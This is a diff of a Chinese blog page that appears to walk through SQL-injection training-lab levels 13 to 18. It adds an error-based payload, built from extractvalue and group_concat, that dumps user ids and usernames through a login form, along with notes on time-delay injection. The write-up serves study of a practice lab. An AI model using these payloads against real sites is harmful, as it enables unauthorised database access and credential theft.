@@ -201,7 +201,7 @@
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>February 18, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>479</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>678</span>
     </div>
   </div>
 </section>
@@ -217,13 +217,19 @@
 
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&#x27;)and left(database(),1)&gt;<span class="hljs-string">&#x27;s&#x27;</span>#&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit//登录失败<br></code></pre></td></tr></table></figure>
 
-
-
+<p>手工注入</p>
 <h4 id="第十四关：双引号"><a href="#第十四关：双引号" class="headerlink" title="第十四关：双引号"></a>第十四关：双引号</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&quot;and extractvalue(1,concat(0x7e,(select username <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">id</span>=1),0x7e))#&amp;passwd=1&amp;submit=Submit<br></code></pre></td></tr></table></figure>
 
 <p>报错注入，post提交</p>
 <p><img   class="lazyload" data-original="/2021/02/18/2021/sql/11-20/image-20220304213044994.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220304213044994"></p>
+<p> 理解到了group_concat函数作为连接字符串的作用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname=admin&quot;and extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">id</span>,<span class="hljs-number">0x3a</span>,username)<span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#&amp;passwd=1&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2021/02/18/2021/sql/11-20/image-20220305155916264.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305155916264"></p>
 <h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关:"></a>第十五关:</h4><p>延时注入</p>
+<p>正确的时候可以直接登录，不正确的时候延时5秒。</p>
+<p><img   class="lazyload" data-original="/2021/02/18/2021/sql/11-20/image-20220305160231930.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305160231930"></p>
+<p><img   class="lazyload" data-original="/2021/02/18/2021/sql/11-20/image-20220305160301815.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305160301815"></p>
 <h4 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h4><p>演示注入</p>
 <h4 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h4><p> 延时注入</p>
 <h4 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h4><p>UA注入</p>
